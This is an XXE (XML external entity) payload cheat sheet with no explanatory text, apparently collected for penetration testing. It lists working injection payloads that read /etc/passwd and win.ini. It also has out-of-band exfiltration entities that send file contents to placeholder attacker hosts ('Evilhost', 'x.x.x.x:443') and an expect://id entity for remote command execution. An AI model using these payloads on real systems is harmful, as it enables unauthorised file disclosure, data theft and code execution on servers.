## Blind xxe ##

<!--?xml version="1.0" encoding="ISO-8859-1" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
----------------------------------------------------------------------------------

<!--?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<item>
 <itemName>Coffee</itemName>
 <itemDescription>&xxe;</itemDescription>
</item>
---------------------------------------------------------------------------------

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

<root>
<name>asdf</name>
<tel>242349</tel>
<email>&xxe;</email>
<password>dsfsakfskfls</password>
</root>
---------------------------------------------------------------------------------

## External DTD ##

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://IP:PORT/test.txt">
]>
<r>&sp;</r>
----------------------------------------------------------------------------------

<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'>">

-------------------------------------------------------------------------------

### for windows (.NET) ## 

<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">

---------------------------------------------------------------------------------------


## POC with RCE ## 

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>

